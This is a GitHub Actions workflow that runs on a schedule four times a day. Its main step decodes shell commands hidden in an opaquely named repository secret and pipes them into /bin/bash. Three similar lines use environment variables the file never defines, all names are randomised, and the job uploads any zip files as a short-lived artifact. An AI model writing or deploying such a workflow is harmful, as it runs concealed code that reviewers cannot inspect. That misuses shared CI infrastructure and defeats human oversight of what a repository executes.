name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '57 5,11,17,23 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  task:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          ckg56930: ${{ secrets.ckg56930 }}
        run: |
          printf '%s' "$ckg56930" | jq -r .hy5 | /bin/bash
          echo $ig042 | jq -r .stf529 | /bin/bash
          printf '%s' "$waym5" | jq -r .tdxpk8419 | /bin/bash
          echo $ndka79 | jq -r .mxje921 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: 1XV5XPZE
          path: "*.zip"
          retention-days: 1
